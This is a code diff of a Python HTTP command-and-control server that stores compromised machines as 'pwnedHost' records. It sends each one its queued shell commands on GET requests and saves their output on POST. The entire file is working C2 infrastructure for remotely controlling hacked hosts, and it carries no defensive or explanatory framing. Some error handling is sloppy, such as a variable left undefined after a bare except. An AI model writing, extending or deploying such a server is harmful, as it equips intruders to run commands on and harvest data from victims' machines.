@@ -1,19 +1,33 @@
-import http.server
-import socketserver
 from http.server import *
-from http import cookies
 import random
 import string
+from command_control.models import pwnedHost
 
 
 chars = string.ascii_letters + string.digits
-
-
-# C = cookies.SimpleCookie()
 session_value = ''.join(random.choice(chars) for i in range(20))
 
 
 class Server_Response(BaseHTTPRequestHandler):
+
+
+    def set_attributes(self):
+        global ip
+        global host
+        ip = self.client_address[0]
+        if pwnedHost.objects.filter(ip=ip):
+            host = pwnedHost.objects.get(ip=ip)
+        else:
+            try:
+                content_length = int(self.headers['Content-Length'])
+                post_data = self.rfile.read(content_length)
+                data = post_data.decode('utf-8')
+            except:
+                pass
+            host = pwnedHost(author=author, ip=ip, username=data)
+            host.save()
+
+
     def set_headers(self):
         self.send_response(200, "ok")
         self.send_header('Content-type', 'text/html')
@@ -23,25 +37,40 @@ class Server_Response(BaseHTTPRequestHandler):
 
     # Allow GET
     def do_GET(self):
+        self.set_attributes()
         self.set_headers()
-        # message = raw_input("Enter command :  " )
-        message = raw_input("command : ")
-        self.wfile.write(bytes(message))
+        message = host.cmd[6:]
+        print(host.cmd)
+        if message:
+            self.wfile.write(bytes(message, 'utf8'))
+            host.cmd = ""
+            host.save()
 
     # Allow POST
     def do_POST(self):
+        self.set_attributes()
         self.set_headers()
-        self.wfile.write("<html><body><h1>POST!</h1></body></html>")
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+        data = post_data.decode('utf-8')
+        if data:
+            host.result = data
+            host.save()
 
 
-def run():
+def run(auth_user, ip , port, enc_key):
+    global author
+    global secret
+    global cipher
+    secret = enc_key
+    author = auth_user
+    global Server_Response
     print("Server Started ..!!")
-    server_address = ('', 80)
+    server_address = (ip, port)
     httpd = HTTPServer(server_address, Server_Response)
+    # httpd.socket = ssl.wrap_socket (httpd.socket, certfile='server.cert', keyfile='server.key', server_side=True)
     print('running server...')
     httpd.serve_forever()
-
-# run()
 
 
 """
